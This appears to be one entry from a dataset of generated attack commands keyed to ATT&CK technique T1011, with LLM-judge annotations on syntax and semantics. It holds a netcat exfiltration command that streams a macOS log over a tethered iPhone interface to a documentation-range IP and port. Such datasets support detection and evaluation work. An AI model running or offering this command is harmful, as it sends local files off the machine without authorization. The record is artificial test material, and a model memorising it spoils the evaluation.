command: dd if=/Users/$USER/Library/Logs/system.log bs=64k | nc -s "$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')" 198.51.100.77 53499
explanation: Streams log data bound to the iPhone USB (cellular tether) interface, exfiltrating over a cellular/USB medium per T1011.
rationale_steps: Obtain iPhone USB IP using networksetup
Bind TCP connection to the tethered IP
Send data to a non-standard high port

llm_judgments.syntactic_justification: The pipeline, quoting, command substitution, and dd/nc flag usage are all properly formed and parseable.
llm_judgments.semantic_justification: While it attempts exfiltration by binding nc to the iPhone USB IP, it does not implement Traffic Signaling behaviors (no covert signaling or field/timing encoding), and it uses a documentation-only destination IP and a likely incorrect log path.
